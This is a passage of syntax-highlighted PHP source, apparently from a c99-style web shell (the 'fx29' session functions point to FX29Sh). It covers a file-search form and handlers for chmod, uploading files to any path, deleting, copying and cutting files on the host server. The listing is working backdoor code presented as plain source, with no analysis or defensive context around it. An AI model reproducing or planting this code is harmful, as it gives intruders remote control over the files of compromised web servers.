Expression&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1502</span> <span class="x">        &lt;tr&gt;&lt;th&gt;Look in (Separate by &quot;;&quot;):&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;search_in&quot; size=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">round</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">)</span><span class="o">+</span><span class="mi">25</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$search_in</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1503</span> <span class="x">        &lt;tr&gt;&lt;th&gt;A word or phrase in the file:&lt;/th&gt;&lt;td&gt;&lt;textarea name=&quot;search_text&quot; cols=&quot;50&quot; rows=&quot;5&quot;&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="o">@</span><span class="nv">$search_text</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1504</span> <span class="x">        &lt;tr&gt;&lt;th&gt;&lt;/th&gt;&lt;td&gt;</span>
<span class="lineno">1505</span> <span class="x">            &lt;input type=&quot;checkbox&quot; name=&quot;search_text_regexp&quot; value=&quot;1&quot; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="p">(</span><span class="o">@</span><span class="nv">$search_text_regexp</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&gt; Regular Expression</span>
<span class="lineno">1506</span> <span class="x">            &lt;input type=&quot;checkbox&quot; name=&quot;search_text_wwo&quot; value=&quot;1&quot; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="p">(</span><span class="o">@</span><span class="nv">$search_text_wwo</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&gt; Whole words only</span>
<span class="lineno">1507</span> <span class="x">            &lt;input type=&quot;checkbox&quot; name=&quot;search_text_cs&quot; value=&quot;1&quot; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="p">(</span><span class="o">@</span><span class="nv">$search_text_cs</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&gt; Case sensitive</span>
<span class="lineno">1508</span> <span class="x">            &lt;input type=&quot;checkbox&quot; name=&quot;search_text_not&quot; value=&quot;1&quot; </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="p">(</span><span class="o">@</span><span class="nv">$search_text_not</span> <span class="o">==</span> <span class="mi">1</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&gt; Find files NOT containing the text</span>
<span class="lineno">1509</span> <span class="x">        &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1510</span> <span class="x">        &lt;tr&gt;&lt;th&gt;&lt;/th&gt;&lt;td&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Search&quot;&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1511</span> <span class="x">    &lt;/table&gt;</span>
<span class="lineno">1512</span> <span class="x">&lt;/form&gt;</span>
<span class="lineno">1513</span> <span class="cp">&lt;?php</span>
<span class="lineno">1514</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;ls&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1515</span>       <span class="nv">$dspact</span> <span class="o">=</span> <span class="nv">$act</span><span class="p">;</span>
<span class="lineno">1516</span>       <span class="k">echo</span> <span class="nv">$searchtime</span><span class="o">.</span><span class="s2">&quot; secs (&quot;</span><span class="o">.</span><span class="nv">$search_i_f</span><span class="o">.</span><span class="s2">&quot; files and &quot;</span><span class="o">.</span><span class="nv">$search_i_d</span><span class="o">.</span><span class="s2">&quot; folders, &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">((</span><span class="nv">$search_i_f</span><span class="o">+</span><span class="nv">$search_i_d</span><span class="p">)</span><span class="o">/</span><span class="nv">$searchtime</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; objects per second).&lt;/b&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1517</span>            <span class="s2">&quot;&lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1518</span>     <span class="p">}</span>
<span class="lineno">1519</span>   <span class="p">}</span>
<span class="lineno">1520</span>   <span class="c1">###[ CHMOD]###</span>
<span class="lineno">1521</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;chmod&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1522</span>     <span class="nv">$mode</span> <span class="o">=</span> <span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">);</span>
<span class="lineno">1523</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$mode</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Change file-mode with error:&lt;/b&gt; can&#39;t get current value.&quot;</span><span class="p">;}</span>
<span class="lineno">1524</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1525</span>       <span class="nv">$form</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno">1526</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$chmod_submit</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1527</span>         <span class="nv">$octet</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span><span class="o">.</span><span class="nb">base_convert</span><span class="p">((</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_o</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_g</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="p">(</span><span class="nv">$chmod_w</span><span class="p">[</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="mi">1</span><span class="o">:</span><span class="mi">0</span><span class="p">),</span><span class="mi">2</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
<span class="lineno">1528</span>         <span class="k">if</span> <span class="p">(</span><span class="nb">chmod</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">,</span><span class="nv">$octet</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="nv">$form</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span> <span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1529</span>         <span class="k">else</span> <span class="p">{</span><span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;Can&#39;t chmod to &quot;</span><span class="o">.</span><span class="nv">$octet</span><span class="o">.</span><span class="s2">&quot;.&quot;</span><span class="p">;}</span>
<span class="lineno">1530</span>       <span class="p">}</span>
<span class="lineno">1531</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$form</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1532</span>         <span class="nv">$perms</span> <span class="o">=</span> <span class="nx">parse_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">);</span>
<span class="lineno">1533</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Changing file-mode (&quot;</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="o">.</span><span class="s2">&quot;), &quot;</span><span class="o">.</span><span class="nx">view_perms_color</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; (&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nb">decoct</span><span class="p">(</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$f</span><span class="p">)),</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span><span class="mi">4</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;)&lt;/b&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1534</span>              <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$err</span><span class="o">?</span><span class="s2">&quot;&lt;b&gt;Error:&lt;/b&gt; &quot;</span><span class="o">.</span><span class="nv">$err</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1535</span>              <span class="s2">&quot;&lt;form name=</span><span class="se">\&quot;</span><span class="s2">f_chmod</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> method=POST&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1536</span>              <span class="s2">&quot;&lt;input type=hidden name=d value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1537</span>              <span class="s2">&quot;&lt;input type=hidden name=f value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1538</span>              <span class="s2">&quot;&lt;input type=hidden name=act value=chmod&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1539</span>              <span class="s2">&quot;&lt;table&gt;&lt;tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1540</span>              <span class="s2">&quot;&lt;td&gt;&lt;b&gt;Owner&lt;/b&gt;&lt;br&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1541</span>              <span class="s2">&quot;&lt;input type=checkbox NAME=chmod_o[r] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; Read&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1542</span>              <span class="s2">&quot;&lt;input type=checkbox name=chmod_o[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; Write&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1543</span>              <span class="s2">&quot;&lt;input type=checkbox NAME=chmod_o[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;o&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; eXecute&lt;/td&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1544</span>              <span class="s2">&quot;&lt;td&gt;&lt;b&gt;Group&lt;/b&gt;&lt;br&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1545</span>              <span class="s2">&quot;&lt;input type=checkbox NAME=chmod_g[r] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; Read&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1546</span>              <span class="s2">&quot;&lt;input type=checkbox NAME=chmod_g[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; Write&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1547</span>              <span class="s2">&quot;&lt;input type=checkbox NAME=chmod_g[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;g&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; eXecute&lt;/td&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1548</span>              <span class="s2">&quot;&lt;td&gt;&lt;b&gt;World&lt;/b&gt;&lt;br&gt;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1549</span>              <span class="s2">&quot;&lt;input type=checkbox NAME=chmod_w[r] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;r&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; Read&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1550</span>              <span class="s2">&quot;&lt;input type=checkbox NAME=chmod_w[w] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;w&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; Write&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1551</span>              <span class="s2">&quot;&lt;input type=checkbox NAME=chmod_w[x] value=1&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$perms</span><span class="p">[</span><span class="s2">&quot;w&quot;</span><span class="p">][</span><span class="s2">&quot;x&quot;</span><span class="p">]</span><span class="o">?</span><span class="s2">&quot; checked&quot;</span><span class="o">:</span><span class="s2">&quot;&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&gt; eXecute&lt;/td&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1552</span>              <span class="s2">&quot;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1553</span>              <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;input type=submit name=chmod_submit value=</span><span class="se">\&quot;</span><span class="s2">Save</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/td&gt;&lt;/tr&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1554</span>              <span class="s2">&quot;&lt;/table&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1555</span>              <span class="s2">&quot;&lt;/form&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1556</span>       <span class="p">}</span>
<span class="lineno">1557</span>     <span class="p">}</span>
<span class="lineno">1558</span>   <span class="p">}</span>
<span class="lineno">1559</span>   <span class="c1">###[ UPLOAD ]###</span>
<span class="lineno">1560</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;upload&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1561</span>     <span class="nv">$uploadmess</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">1562</span>     <span class="nv">$uploadpath</span> <span class="o">=</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$uploadpath</span><span class="p">))</span> <span class="o">?</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$uploadpath</span><span class="p">)</span> <span class="o">:</span> <span class="nv">$d</span><span class="p">;</span>
<span class="lineno">1563</span>     <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$uploadpath</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$uploadpath</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1564</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1565</span>       <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">&quot;uploadfile&quot;</span><span class="p">];</span>
<span class="lineno">1566</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">]))</span> <span class="p">{</span>
<span class="lineno">1567</span>         <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$uploadfilename</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$destin</span> <span class="o">=</span> <span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span> <span class="p">}</span>
<span class="lineno">1568</span>         <span class="k">else</span> <span class="p">{</span> <span class="nv">$destin</span> <span class="o">=</span> <span class="nv">$userfilename</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1569</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">],</span><span class="nv">$uploadpath</span><span class="o">.</span><span class="nv">$destin</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1570</span>           <span class="nv">$uploadmess</span> <span class="o">.=</span> <span class="s2">&quot;&lt;div class=errmsg&gt;Error uploading file &quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot; (Can&#39;t copy </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="p">[</span><span class="s2">&quot;tmp_name&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> to </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadpath</span><span class="o">.</span><span class="nv">$destin</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">!&lt;/div&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1571</span>         <span class="p">}</span>
<span class="lineno">1572</span>         <span class="k">else</span> <span class="p">{</span> <span class="nv">$uploadmess</span> <span class="o">.=</span> <span class="s2">&quot;File uploaded successfully!&lt;br&gt;&quot;</span><span class="o">.</span><span class="nv">$uploadpath</span><span class="o">.</span><span class="nv">$destin</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1573</span>       <span class="p">}</span>
<span class="lineno">1574</span>       <span class="k">else</span> <span class="p">{</span> <span class="nv">$uploadmess</span> <span class="o">.=</span> <span class="s2">&quot;&lt;div class=errmsg&gt;No file to upload!&lt;/div&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1575</span>     <span class="p">}</span>
<span class="lineno">1576</span>     <span class="k">echo</span> <span class="nv">$uploadmess</span><span class="p">;</span>
<span class="lineno">1577</span>     <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="lineno">1578</span>   <span class="p">}</span>
<span class="lineno">1579</span>   <span class="c1">###{ DELETE }###</span>
<span class="lineno">1580</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;delete&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1581</span>     <span class="nv">$delerr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">1582</span>     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$actbox</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1583</span>       <span class="nv">$result</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span>
<span class="lineno">1584</span>       <span class="nv">$result</span> <span class="o">=</span> <span class="nx">fs_rmobj</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">1585</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$delerr</span> <span class="o">.=</span> <span class="s2">&quot;Can&#39;t delete &quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1586</span>     <span class="p">}</span>
<span class="lineno">1587</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$delerr</span><span class="p">))</span> <span class="p">{</span> <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Error deleting:&lt;br&gt;</span><span class="si">$delerr</span><span class="s2">&quot;</span><span class="p">);</span> <span class="p">}</span>
<span class="lineno">1588</span>     <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="lineno">1589</span>   <span class="p">}</span>
<span class="lineno">1590</span>   <span class="c1">###[ COPY ]###</span>
<span class="lineno">1591</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;copy&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1592</span>     <span class="nv">$err</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno">1593</span>     <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">],</span><span class="nv">$actbox</span><span class="p">);</span>
<span class="lineno">1594</span>     <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
<span class="lineno">1595</span>     <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="lineno">1596</span>   <span class="p">}</span>
<span class="lineno">1597</span>   <span class="c1">###[ CUT ]###</span>
<span class="lineno">1598</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;cut&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1599</span>     <span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">],</span><span class="nv">$actbox</span><span class="p">);</span>
<span class="lineno">1600</span>     <span class="nx">fx29_sess_put</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">);</span>
<span class="lineno">1601</span>     <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span>
<span class="lineno">1602</span>   <span class="p">}</span>
<span class="lineno">1603</span>   <span class="c1">###[ UNSELECT ]###</span>
<span class="lineno">1604</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;unselect&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1605</span>     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1606</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span> <span class="nb">unset</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]);</span> <span class="p">}</span>
<span class="lineno">1607</span>     <span class="p">}</span>
<span class="lineno">1608</span>     <span class="k">foreach</span> <span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&gt;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
